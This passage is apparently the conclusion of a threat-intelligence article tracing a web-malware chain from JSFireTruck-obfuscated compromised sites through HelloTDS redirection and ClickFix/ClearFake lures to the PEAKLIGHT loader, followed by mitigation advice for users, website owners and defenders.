*   **Enhanced Resilience:** Techniques like using blockchain (e.g., EtherHiding in ClearFake campaigns) for parts of the command-and-control or payload delivery infrastructure increase resilience against takedowns.

*   **Stealth and Scale through Sophistication:**
    *   Advanced fingerprinting capabilities.
    *   Use of dynamic domain infrastructure.
    *   Sophisticated deception tactics (mimicking legitimate sites, serving benign content to researchers or unsuitable targets).
    These elements combined allow attackers to achieve both significant operational stealth and massive scale, as evidenced by the widespread JSFireTruck infections.

*   **Coordinated Efforts:** The scale and complexity suggest coordinated efforts, with TDS operations like VexTrio functioning akin to large, commercial cybercriminal affiliate networks.

## Conclusion & Key Takeaways

The detailed attack chain:
**➔ Initial Compromise 
➔ JSFireTruck Obfuscation 
➔ Referrer Filtering & TDS Hand-off 
➔ HelloTDS (Advanced Fingerprinting & Conditional Redirection) 
➔ ClickFix/ClearFake Social Engineering 
➔ PEAKLIGHT Loader 
➔ Final Malware (Stealers, RATs)**

This chain reveals a highly **adaptive and dangerous threat**. It masterfully leverages multiple layers of deception and technical evasion to achieve both operational stealth and widespread impact.

**Key Learnings:**
*   User education regarding social engineering tactics is paramount.
*   Robust, multi-layered security solutions are crucial for detection and prevention.
*   The interconnectedness of these attack stages highlights the need for a holistic approach to cybersecurity.

## Mitigation & Defense Strategies

*   **For Users:**
    *   Employ reputable security software and ensure browser protections are active and updated.
    *   Exercise extreme caution with unknown websites, unexpected pop-ups, and prompts, *especially those asking to copy-paste commands into a terminal or PowerShell*.
    *   Be skeptical of urgent "verification" or "update" messages.

*   **For Website Owners:**
    *   Conduct regular security audits and vulnerability assessments.
    *   Apply patches for CMS, plugins, and server software promptly.
    *   Implement Web Application Firewalls (WAFs).
    *   Utilize file integrity monitoring and maintain regular, secure backups.

*   **For Security Professionals:**
    *   Actively monitor for JSFireTruck obfuscation patterns and other advanced obfuscation techniques.
    *   Track TDS infrastructure, including associated Indicators of Compromise (IoCs) like suspicious domain registration patterns (e.g., `.top`, `.shop` TLDs if linked to known campaigns).
    *   Analyze multi-stage redirection tactics and develop signatures for fingerprinting scripts and TDS communication.
